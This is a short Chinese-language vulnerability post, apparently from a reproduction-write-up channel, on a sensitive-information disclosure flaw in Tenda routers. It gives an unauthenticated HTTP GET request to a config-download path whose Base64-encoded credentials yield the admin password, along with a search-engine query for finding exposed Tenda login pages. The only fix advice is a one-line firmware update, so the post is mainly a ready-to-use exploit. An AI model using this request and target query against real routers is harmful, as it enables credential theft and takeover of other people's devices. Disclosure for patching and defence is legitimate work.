#  腾达路由器敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-27 02:11  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
  
  
腾达路由器  
敏感信息泄露漏洞  
  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIctpvLb9JFwPfFDicia0gHCltpmcs8o9p52cqdGSa6kZSD40Prxk7aXP2ZegiaM2wt0mZHrv4tbonVw/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞简介  
腾达（Tenda）是知名的网络设备制造商，其路由器产品覆盖家用、商用等多个场景，以高性  
能、易用性和稳定性著称。腾达无线路由器致力于为家庭用户提供舒适、便捷、自然的智慧家庭体验。简单便捷的部署在家庭中,彻底解决家庭用户的网络接入问题,并提供高速稳定、  
多终端接入、低功率低辐射的健康好网络。  
攻击者通过访问  
/cgi-bin/DownloadCfg/RouterCfm.jpg  
路径可获取路由器配置文件，文件中包含加密的账号密码信息，经Base64解码后可直接获取明文密码，进而登录路由器后台，甚至获取Root管理权限。  
  
  
04  
  
—  
  
资产测绘  
  
```
title="Tenda | Login"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIctpvLb9JFwPfFDicia0gHClZ0iaSQWunACOVm6WIGPYCQjtKNLpZC2QPPticoIgLJcibiaPXicu0OVBRicA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
Host: xxx.xx.xxx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIctpvLb9JFwPfFDicia0gHClZjqvDzaaOoDK4yyyDficy8bkIx8iaicxmqjfRqXJAHJkxCcncMJ4x9ickQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIctpvLb9JFwPfFDicia0gHClWuVWcEJknfj68z882eTDej2KSQ6dmStxAsa2nkY0R9qbLAgq33BbjQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIctpvLb9JFwPfFDicia0gHClOJo03iaJKVGszOsj9Xb4LbUUQg7ib3znyb0kDic7EYN1HUYEBdcNj9rFw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
**将路由器固件更新到最新版本**  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
